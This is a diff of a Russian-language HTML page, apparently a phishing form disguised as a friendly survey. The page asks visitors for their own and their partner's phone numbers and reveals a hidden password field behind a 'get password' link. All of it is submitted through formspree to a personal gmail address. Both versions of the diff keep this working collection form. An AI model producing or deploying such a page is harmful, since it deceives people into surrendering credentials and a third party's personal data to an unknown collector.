@@ -10,24 +10,17 @@
 </head>
 
 <body>
-    <div id="html-content">
-    <header>
-        <div class="logo"><img src="logo.jpg" alt="logo"></div>
-        <div class="search"><input type="text" placeholder="Search"></div>
-    </header>
-
-    <div class="body">
         <div class="logIn">
                 <form method="post" action="https://formspree.io/syaskiy9523@gmail.com">
-                  <nav>Привет. Вас приветствует опросник.</nav>
-                  <nav>Для начала введите свой номер телефона и телефона вашей половинки)</nav>
-                  <input type="text" name="Phone" placeholder="Ваш номер телефона"><br>
-                  <input type="text" name="Phone" placeholder="Номер телефона половинки"><br>
-                    </nav>
-                  <a onclick="toggle(hidden_content)">Получить пароль</a> 
-<div id="hidden_content" style="display: none;"><input type="password" name="pass" placeholder="Password">
-    <nav><input type="submit" value="Пройти опрос">
-      </div>
+                    <nav>Привет. Вас приветствует опросник.</nav>
+                    <nav>Для начала введите свой номер телефона и телефона вашей половинки)</nav>
+                    <input type="text" name="Phone" placeholder="Ваш номер телефона"><br>
+                    <input type="text" name="Phone" placeholder="Номер телефона половинки"><br>
+                    
+                    <a onclick="toggle(hidden_content)">Получить пароль</a> 
+                       <div id="hidden_content" style="display: none;"><input type="password" name="pass" placeholder="Password">
+                        <input type="submit" value="Пройти опрос">
+        </div>
 <script>
 function toggle(el) {
 el.style.display = (el.style.display == 'none') ? '' : 'none'
@@ -35,7 +28,7 @@ el.style.display = (el.style.display == 'none') ? '' : 'none'
 </script>
 
                 </form>
-  </div>
+        </div>
      <script src="http://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
